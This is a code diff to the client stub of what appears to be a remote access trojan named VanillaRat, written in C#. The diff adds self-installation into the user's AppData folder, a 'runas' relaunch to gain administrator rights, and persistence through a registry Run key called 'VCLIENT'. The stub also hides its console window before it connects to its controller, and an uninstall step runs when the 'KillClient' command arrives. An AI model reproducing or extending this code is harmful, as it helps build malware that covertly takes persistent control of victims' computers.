@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Configuration;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -7,12 +8,15 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Permissions;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using Microsoft.Win32;
 using StreamLibrary;
 using StreamLibrary.UnsafeCodecs;
 using Telepathy;
+using static System.Windows.Forms.Application;
 using Message = Telepathy.Message;
 using ThreadState = System.Threading.ThreadState;
 
@@ -28,7 +32,8 @@ namespace VanillaRatStub
         private static bool USActive; 
         private static bool ReceivingFile; 
         private static string FileToWrite = ""; 
-        private static int UpdateInterval; 
+        private static int UpdateInterval;
+        private static readonly string InstallDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + AppDomain.CurrentDomain.FriendlyName;
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
@@ -50,15 +55,84 @@ namespace VanillaRatStub
 
         #region Entry Point
 
+        private static bool IsInstalled()
+        {
+            if (ExecutablePath == InstallDirectory)
+                return true;
+            return false;
+        }
+        private static void RaisePerms()
+        {
+            Process P = new Process();
+            P.StartInfo.FileName = ExecutablePath;
+            P.StartInfo.UseShellExecute = true;
+            P.StartInfo.Verb = "runas";
+            P.Start();
+            Environment.Exit(0);
+        }
+
+        private static bool IsAdmin()
+        {
+            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
+                .IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
         private static void Main(string[] args)
         {
+            if (ClientSettings.Admin == "True" && !IsAdmin())
+            {
+                RaisePerms();
+            }
+            if (ClientSettings.Install == "True" && !IsInstalled())
+            {
+                if (!IsAdmin())
+                    RaisePerms();
+                if (!IsInstalled())
+                {
+                    File.Copy(ExecutablePath, InstallDirectory, true);
+                    Process.Start(InstallDirectory);
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    if (ClientSettings.Startup == "True")
+                    {                      
+                        RegistryKey RK =
+                            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        try
+                        {
+                            RK.DeleteValue("VCLIENT", false);
+                        }
+                        catch { }
+                        try
+                        {
+                            RK.SetValue("VCLIENT", ExecutablePath);
+                        }
+                        catch { }
+                    }
+                }
+            }
             UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
             var handle = GetConsoleWindow(); 
             ShowWindow(handle, SW_HIDE);
             Connect();
             Console.ReadLine(); 
         }
-
+        private static void UninstallClient()
+        {
+            try
+            {
+                RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                RK.DeleteValue("VCLIENT", false);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+                throw;
+            }          
+        }
+      
+       
         #endregion Entry Point
 
         #region Connection & Data Loop
@@ -156,6 +230,7 @@ namespace VanillaRatStub
 
             if (StringForm == "KillClient")
             {
+                UninstallClient();
                 Environment.Exit(0);
             }
             else if (StringForm == "DisconnectClient")
@@ -297,7 +372,7 @@ namespace VanillaRatStub
             else if (StringForm.Equals("RaisePerms"))
             {
                 Process P = new Process();
-                P.StartInfo.FileName = Application.ExecutablePath;
+                P.StartInfo.FileName = ExecutablePath;
                 P.StartInfo.UseShellExecute = true;
                 P.StartInfo.Verb = "runas";
                 List<byte> ToSend = new List<byte>();
